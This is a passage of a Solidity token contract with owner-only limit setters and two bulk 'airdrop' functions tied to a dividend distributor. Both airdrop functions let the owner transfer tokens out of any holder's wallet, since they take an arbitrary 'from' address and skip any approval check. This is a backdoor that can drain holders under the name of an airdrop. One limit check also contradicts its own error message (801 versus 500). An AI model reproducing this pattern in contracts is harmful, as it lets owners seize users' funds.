  function setMaxWalletPercent_base1000(uint256 maxWallPercent_base1000)
    external
    onlyOwner()
  {
    _maxWalletToken = rSupply.div(1000).mul(maxWallPercent_base1000);
  }

  function setMaxTxPercent_base1000(uint256 maxTXPercentage_base1000)
    external
    onlyOwner()
  {
    _maxTxAmount = rSupply.div(1000).mul(maxTXPercentage_base1000);
  }

  /* Airdrop Begins */

  function multiTransfer(
    address from,
    address[] calldata addresses,
    uint256[] calldata tokens
  ) external onlyOwner {
    require(
      addresses.length < 801,
      "GAS Error: max airdrop limit is 500 addresses"
    ); // to prevent overflow
    require(
      addresses.length == tokens.length,
      "Mismatch between Address and token count"
    );

    uint256 SCCC = 0;

    for (uint256 i = 0; i < addresses.length; i++) {
      SCCC = SCCC + tokens[i];
    }

    require(balanceOf(from) >= SCCC, "Not enough tokens in wallet");

    for (uint256 i = 0; i < addresses.length; i++) {
      _basicTransfer(from, addresses[i], tokens[i]);
      if (!isDividendExempt[addresses[i]]) {
        try
          distributor.setShare(addresses[i], balanceOf(addresses[i]))
        {} catch {}
      }
    }

    // Dividend tracker
    if (!isDividendExempt[from]) {
      try distributor.setShare(from, balanceOf(from)) {} catch {}
    }
  }

  function multiTransfer_fixed(
    address from,
    address[] calldata addresses,
    uint256 tokens
  ) external onlyOwner {
    require(
      addresses.length < 2001,
      "GAS Error: max airdrop limit is 2000 addresses"
    ); // to prevent overflow

    uint256 SCCC = tokens * addresses.length;

    require(balanceOf(from) >= SCCC, "Not enough tokens in wallet");

    for (uint256 i = 0; i < addresses.length; i++) {
      _basicTransfer(from, addresses[i], tokens);
      if (!isDividendExempt[addresses[i]]) {
        try
          distributor.setShare(addresses[i], balanceOf(addresses[i]))
        {} catch {}
      }
    }

    // Dividend tracker
    if (!isDividendExempt[from]) {
      try distributor.setShare(from, balanceOf(from)) {} catch {}
    }
  }

  event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}
